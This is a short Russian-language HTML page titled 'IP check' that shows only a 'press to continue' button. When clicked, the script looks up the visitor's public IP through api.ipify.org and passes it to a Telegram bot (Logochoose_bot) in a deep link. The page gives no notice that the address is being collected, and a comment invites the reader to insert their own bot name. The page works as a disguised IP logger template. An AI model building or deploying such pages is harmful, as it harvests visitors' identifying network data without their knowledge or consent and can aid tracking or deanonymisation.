<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Проверка IP</title>
</head>
<body>
    <h2>Для продолжения нажмите кнопку</h2>
    <button id="continueBtn">Продолжить</button>

    <script>
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch (err) {
                console.error('Ошибка при получении IP:', err);
                return null;
            }
        }

        document.getElementById('continueBtn').addEventListener('click', async () => {
            const ip = await getIP();
            if (!ip) {
                alert('Не удалось получить IP. Попробуйте снова.');
                return;
            }
            // Генерируем ссылку на бота с IP через deep link
            const botUsername = 'Logochoose_bot'; // Вставь юзернейм своего бота
            const link = `https://t.me/${botUsername}?start=${ip}`;
            window.open(link, '_blank'); // Открываем Telegram
        });
    </script>
</body>
</html>
